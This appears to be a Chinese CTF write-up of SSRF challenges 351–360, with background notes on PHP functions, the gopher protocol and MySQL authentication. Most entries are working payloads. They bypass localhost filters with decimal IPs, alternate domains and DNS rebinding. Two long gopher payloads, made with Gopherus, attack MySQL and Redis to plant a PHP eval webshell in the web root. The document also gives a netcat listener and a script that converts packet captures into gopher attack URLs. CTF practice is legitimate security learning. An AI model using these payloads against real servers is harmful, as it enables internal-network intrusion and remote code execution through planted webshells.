## 351、POST

```python
# 无
url=http://127.0.0.1/flag.php
```

## 352、POST

```python
# 过滤localhost + 127.0.0
url=http://0/flag.php
```

## 353、POST

```python
# 过滤localhost + 127.0.0 + 。
url=http://2130706433/flag.php
```

## 354、POST

```PYTHON
# 过滤 [0 1 。]
url=http://sudo.cc/flag.php
```

## 355、POST

```python
# 域名长度小于5
url=http://0/flag.php
```

## 356、POST

```python
# 域名长度小于3
url=http://0/flag.php
```

## 357、POST

```python
# 只允许访问RFC指定的私域IP
1、打开http://ceye.io/profile
2、生成2个IP地址用于DNS重绑定（其中一个是127.0.0.1）
url=http://r.[ceye分配的域名]/flag.php
```

## 358、POST

```python
# 限制必须包含指定域名
url=http://ctf.@127.0.0.1/flag.php
    select "<?php eval($_POST[1]);?>" into outfile "/var/www/html/2.php"
```

## 359、Gopher

```php
# Gopherus生成Payload
# 1、
python2 gopherus.py --exploit mysql
root
select "<?php eval($_POST[1]);?>" into outfile "/var/www/html/2.php"
# 2、
得到一串字符，将_之后的字符进行url编码
# 3、
check.php中POST传参
returl=gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2545%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2527%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2531%255d%2529%253b%253f%253e%2527%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2536%252e%2570%2568%2570%2527%2501%2500%2500%2500%2501
# 4、
访问6.php进行一句话木马执行
```



## 360、Gopher

```php
# Gopherus生成Payload
# 1、
python2 gopherus.py --exploit redis
PHPshell
<?php eval($_POST[1]);?>
# 2、
得到一串字符，进行url编码
# 3、
url=gopher%3a%2f%2f127.0.0.1%3a6379%2f_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252428%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B1%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2fvar%2fwww%2fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A
# 4、
访问shell.php进行一句话木马执行
```



## N、知识点

### 1、PHP相关

```php
# filter_var()
解释：通过指定的过滤器过滤一个变量
语法：filter_var(variable,filter,options)
	variable：变量
	filter：规定要使用的过滤器ID（可选）
	options：规定一个包含标志的关联数组或一个单一的标志
FILTER_VALIDATE_IP：把值作为IP地址验证
FILTER_FLAG_NO_PRIV_RANGE：要求值是RFC指定的私域IP
    	10.0.0.0 - 10.255.255.255
    	172.16.0.0 - 172.31.255.255
    	192.168.0.0 - 192.168.255.255
FILTER_FLAG_NO_RES_RANGE：要求值不在保留的IP范围内
```

```php
# file_get_contents()
解释：把整个文件读入一个字符串中
语法：file_get_contents(path,include_path,context.start,max_length)
	path：规定要读取的文件
	include_path：想在php.ini中搜索文件，设置该参数为1
	context：规定文件句柄的环境
	start：规定在文件中开始读取的位置
	max_length：规定读取的字节数
```

```python
# header()
解释：向客户端发送原始的HTTP报头
语法：header(string,replace,http_response_code)
	string：规定要发送的报头字符串
	replace：TRUE为替换之前的报头，FALSE允许相同类型的多个报头
	http_response_code：把HTTP响应代码强制为指定的值
示例：header(Location: http://127.0.0.1/flag.php)
```



### 2、Gopher

​	2.1、介绍

```php
# 解释
	Gopher协议时HTTP协议出现之前，在互联网常见且常用的一种协议，在SSRF中常用于构造POST包攻击内网应用。Gopher协议没有默认端口，所以需要指定Web端口，且指定POST方法。如果需要在地址栏利用Payload需要再进行一次url编码。
```

​	2.2、实例

```php
# 服务端
nc -lvvp 9999
```

```php
# 客户端
curl gopher://localhost:9999/_hello%0agopher
```

​	2.3、Mysql通信方式

```php
Unix套接字
内存共享/命名管道套接字
TCP/IP套接字
```

​	2.4、认证过程

```php
# 连接阶段（Connection Phase）
1、握手包
2、认证包
	- 密码认证
	- 无密码认证
```

```php
# 命令阶段（Command Phase）
```

​	2.5、Mysql无密码认证攻击 - 手工

```php
# 本地
# 1、新建无密码用户
	CREATE USER 'test'@'localhost';
	GRANT ALL ON *.* TO 'test'@'localhost';
# 2、窗口1开启抓包
	tcpdump -i lo port 3306 -w mysql.pcay
# 3、窗口2连接Mysql并执行命令
	mysql -h 127.0.0.1 -u test
	show databases
	show tables
	select * from flag
# 4、Wirshark分析
	4.1、过滤出客户端发送到Mysql服务器的数据包
	4.1、将格式调整为原始数据
	4.2、保存为原始数据
# 5、转换为gopher协议的脚本
	def results(s):
		a = [s[i:i + 2] for i in xrange(0,len(S),2)]
		return "curl gopher://127.0.0.1:3306/_%" + "%" . join(a)
	if __name__ == "__main__":
		import sys
		s = sys.argv[1]
		print(results(S))
# 6、调用脚本
    python3 gopher-mysql.py [原始数据]
    注：如果参数在GET中传输，需要对数据再次url编码
# 7、导出查询结果
    [以上结果] --out flag.txt
```

​	2.6、Mysql无密码认证攻击 - gopherus

```php
# 启用gopherus
python2 gopherus.py --exploit mysql
```

```php
# 输入命令
Give MySQL username: test
Give query to execute: use test;select * from flag;
```



### 3、套接字（Socket）

```php
# 解释
	TCP用主机的IP地址加上主机上的端口号作为TCP连接的端点，这个端点就被称作套接字（Socket）。套接字用（IP:PORT）表示，区分不同应用程序进程间的网络通信和连接。套接字有三个参数：IP、TCP/UDP、PORT。
```

```php
# 连接过程
1、服务器监听
2、客户端请求
3、连接确认
```

